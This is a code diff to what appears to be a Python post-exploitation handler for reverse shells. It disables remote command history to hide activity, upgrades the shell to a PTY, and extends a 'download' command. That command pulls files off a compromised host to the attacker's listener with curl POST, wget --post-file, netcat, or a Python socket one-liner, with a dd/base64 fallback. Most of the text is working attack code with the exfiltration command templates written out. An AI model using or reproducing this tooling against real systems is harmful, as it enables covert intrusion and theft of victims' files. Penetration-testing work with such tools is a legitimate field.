@@ -1,6 +1,7 @@
 #!/usr/bin/env python3
-from prompt_toolkit import prompt
+from prompt_toolkit import prompt, PromptSession
 from prompt_toolkit.shortcuts import ProgressBar
+import subprocess
 import logging
 import argparse
 import base64
@@ -60,13 +61,20 @@ class PtyHandler:
         self.lhost = None
         self.known_binaries = {}
         self.vars = {"lhost": None}
+        self.prompt = PromptSession("localhost$ ")
+
+        # We should always get a response within 3 seconds...
+        self.client.settimeout(3)
 
         # Ensure history is disabled
         util.info("disabling remote command history", overlay=True)
         client.sendall(b"unset HISTFILE\n")
+        self.recvuntil(b"\n")
 
         util.info("setting terminal prompt", overlay=True)
         client.sendall(b'export PS1="(remote) \\u@\\h\\$ "\n\n')
+        self.recvuntil(b"\n")
+        self.recvuntil(b"\n")
 
         # Locate interesting binaries
         for name, friendly, priority in PtyHandler.INTERESTING_BINARIES:
@@ -98,6 +106,9 @@ class PtyHandler:
         # Open the PTY
         util.info(f"opening pseudoterminal via {method}", overlay=True)
         client.sendall(method_cmd.encode("utf-8") + b"\n")
+
+        # Make sure HISTFILE is unset in this PTY
+        self.run("unset HISTFILE")
 
         # Synchronize the terminals
         util.info("synchronizing terminal state", overlay=True)
@@ -159,26 +170,34 @@ class PtyHandler:
         # Process commands
         while self.state is State.COMMAND:
             try:
-                line = prompt("localhost$ ")
-            except EOFError:
-                # The user pressed ctrl-d, go back
-                self.enter_raw()
+                try:
+                    line = self.prompt.prompt()
+                except (EOFError, OSError):
+                    # The user pressed ctrl-d, go back
+                    self.enter_raw()
+                    continue
+
+                if len(line) > 0 and line[0] == "!":
+                    # Allow running shell commands
+                    subprocess.run(line[1:], shell=True)
+                    continue
+
+                argv = shlex.split(line)
+
+                # Empty command
+                if len(argv) == 0:
+                    continue
+
+                try:
+                    method = getattr(self, f"do_{argv[0]}")
+                except AttributeError:
+                    util.warn(f"{argv[0]}: command does not exist")
+                    continue
+
+                # Call the method
+                method(argv[1:])
+            except KeyboardInterrupt:
                 continue
-
-            argv = shlex.split(line)
-
-            # Empty command
-            if len(argv) == 0:
-                continue
-
-            try:
-                method = getattr(self, f"do_{argv[0]}")
-            except AttributeError:
-                util.warn(f"{argv[0]}: command does not exist")
-                continue
-
-            # Call the method
-            method(argv[1:])
 
     def do_back(self, _):
         """ Exit command mode """
@@ -187,25 +206,29 @@ class PtyHandler:
     def do_download(self, argv):
 
         uploaders = {
-            "XXXXX": (
+            "curl": (
                 "http",
-                "curl -X POST --data @{remote_file} http://{lhost}:{lport}/{lfile}",
+                "{cmd} -X POST --data @{remote_file} http://{lhost}:{lport}/{lfile}",
             ),
             "XXXX": (
                 "http",
-                "wget --post-file {remote_file} http://{lhost}:{lport}/{lfile}",
+                "{cmd} --post-file {remote_file} http://{lhost}:{lport}/{lfile}",
             ),
-            "nxc": ("raw", "nc {lhost} {lport} < {remote_file}"),
+            "nc": ("raw", "nc {lhost} {lport} < {remote_file}"),
+            "python": (
+                "raw",
+                """{cmd} -c 'from socket import AF_INET, socket, SOCK_STREAM; import shutil; s=socket(AF_INET, SOCK_STREAM); s.connect(("{lhost}", {lport})); fp = open("{remote_file}", "rb"); shutil.copyfileobj(fp, s.makefile("wb", buffering=0))'""",
+            ),
         }
         servers = {"http": util.receive_http_file, "raw": util.receive_raw_file}
 
-        parser = argparse.ArgumentParser(prog="upload")
+        parser = argparse.ArgumentParser(prog="download")
         parser.add_argument(
             "--method",
             "-m",
             choices=uploaders.keys(),
             default=None,
-            help="set the upload method (default: auto)",
+            help="set the download method (default: auto)",
         )
         parser.add_argument(
             "--output",
@@ -235,10 +258,11 @@ class PtyHandler:
                 if m in self.known_binaries:
                     util.info(f"downloading via {m}")
                     method = info
+                    args.method = m
                     break
             else:
                 util.warn(
-                    "no available upload methods. falling back to dd/base64 method"
+                    "no available download methods. falling back to dd/base64 method"
                 )
 
         path = args.path
@@ -271,20 +295,23 @@ class PtyHandler:
                 server = servers[method[0]](outfile, name, progress=on_progress)
 
                 command = method[1].format(
+                    cmd=self.known_binaries[args.method][0],
                     remote_file=shlex.quote(path),
                     lhost=self.vars["lhost"],
                     lfile=name,
                     lport=server.server_address[1],
                 )
-                print(command)
                 result = self.run(command, wait=False)
             else:
                 server = None
+                path = shlex.quote(path)
                 with open(outfile, "wb") as fp:
                     copied = 0
-                    for chunk_nr in range(0, size, 8192):
+                    blocksz = 1024 * 10
+                    for chunk_nr in range(0, size // blocksz):
+                        # Send the command
                         encoded = self.run(
-                            f"dd if={shlex.quote(path)} bs=8192 count=1 skip={chunk_nr} 2>/dev/null | base64"
+                            f"dd if={path} bs={blocksz} count=1 skip={chunk_nr} 2>/dev/null | base64 -w0",
                         )
                         chunk = base64.b64decode(encoded)
                         fp.write(chunk)
@@ -466,15 +493,17 @@ class PtyHandler:
         # This works by waiting for our known prompt
         self.recvuntil(b"(remote) ")
         try:
+            # Read to the end of the prompt
             self.recvuntil(b"$ ", socket.MSG_DONTWAIT)
-            self.recvuntil(b"# ", socket.MSG_DONTWAIT)
         except BlockingIOError:
-            pass
+            # The prompt may be "#"
+            try:
+                self.recvuntil(b"# ", socket.MSG_DONTWAIT)
+            except BlockingIOError:
+                pass
 
-        # Surround the output with known delimeters
-        # self.client.send(b"echo _OUTPUT_DELIM_START_\r")
+        # Send the command to the remote host
         self.client.send(cmd.encode("utf-8") + EOL)
-        # self.client.send(b"echo -e '" + DELIM_ESCAPED + b"'\r")
 
         # Initialize response buffer
         response = b""
